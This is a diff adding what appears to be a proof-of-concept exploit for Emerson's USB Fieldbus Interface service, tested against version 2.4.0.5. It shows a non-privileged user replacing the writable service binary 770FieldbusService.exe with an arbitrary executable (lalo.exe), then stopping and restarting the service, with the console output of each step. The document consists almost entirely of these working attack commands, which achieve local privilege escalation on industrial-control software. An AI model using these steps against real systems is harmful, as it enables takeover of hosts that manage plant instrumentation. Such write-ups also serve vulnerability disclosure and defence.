@@ -1,0 +1,19 @@
+Tested against v2.4.0.5
+https://www.emerson.com/en-us/catalog/ams-instrument-inspector
+
+C:\Users\nonpriv\Desktop>cd "C:\Program Files (x86)\Emerson Process Management\USB Fieldbus Interface\Service\"
+C:\Program Files (x86)\Emerson Process Management\USB Fieldbus Interface\Service>rename 770FieldbusService.exe 770FieldbusService.exe.bak
+C:\Program Files (x86)\Emerson Process Management\USB Fieldbus Interface\Service>copy "c:\Users\nonpriv\Desktop\lalo.exe" 770FieldbusService.exe
+        1 file(s) copied.
+C:\Program Files (x86)\Emerson Process Management\USB Fieldbus Interface\Service>stop.bat
+Stopping 770 Fieldbus Interface service...
+SERVICE_NAME: 770FieldbusService
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+C:\Program Files (x86)\Emerson Process Management\USB Fieldbus Interface\Service>start.bat
+Starting 770 Fieldbus Interface service...
